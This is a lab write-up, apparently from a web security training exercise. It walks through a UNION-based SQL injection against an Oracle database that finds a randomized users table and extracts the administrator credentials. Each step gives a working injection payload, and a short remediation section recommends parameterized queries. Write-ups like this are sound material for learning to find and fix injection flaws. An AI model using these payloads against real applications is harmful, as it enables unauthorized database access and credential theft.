# Lab 14: SQL injection attack, listing the database contents on Oracle

**Date:** February 6, 2026
**Vulnerability Type:** SQL Injection (UNION-based)
**Difficulty:** Practitioner
**Status:** SOLVED

## 1. Objective
Map the database schema and exfiltrate administrative credentials from an Oracle database where table and column names are randomized.

## 2. Methodology
Oracle requires the `FROM` clause in all `SELECT` statements and uses `all_tables` / `all_tab_columns` for metadata instead of `information_schema`.

### Step 1: Identify Column Count & Type
- **Payload:** `' UNION SELECT NULL, 'abc' FROM dual--`
- **Result:** Confirmed 2 columns; Column 2 is string-compatible.

### Step 2: Locate Randomized Table
- **Payload:** `' UNION SELECT NULL, table_name FROM all_tables WHERE table_name LIKE 'USERS_%'--`
- **Result:** Identified table name (e.g., `USERS_ABCDEF`).

### Step 3: Identify Column Names
- **Payload:** `' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = '[TABLE_NAME]'--`

### Step 4: Data Exfiltration
- **Payload:** `' UNION SELECT NULL, [USER_COL] || ':' || [PASS_COL] FROM [TABLE_NAME]--`

## 3. Results
Successfully concatenated and exfiltrated the `administrator` credentials to bypass authentication.

## 4. Remediation
Implement parameterized queries and ensure the database user has restricted access to system metadata tables like `all_tables`.
